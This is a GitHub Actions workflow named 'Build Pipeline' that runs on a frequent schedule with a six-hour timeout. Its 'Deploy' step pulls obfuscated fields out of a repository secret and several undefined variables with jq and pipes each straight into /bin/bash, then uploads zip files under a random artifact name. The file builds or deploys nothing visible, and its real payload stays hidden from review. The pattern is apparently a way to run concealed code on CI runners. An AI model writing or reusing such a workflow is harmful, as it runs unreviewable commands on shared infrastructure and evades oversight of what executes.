name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '9 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          zish364: ${{ secrets.zish364 }}
        run: |
          printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
          echo $rp37 | jq -r .l3 | /bin/bash
          printf '%s' "$haxl7" | jq -r .ruht30 | /bin/bash
          printf '%s' "$m1" | jq -r .frl592 | /bin/bash

      - name: Save results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: DkiEleBH
          path: "*.zip"
          retention-days: 1
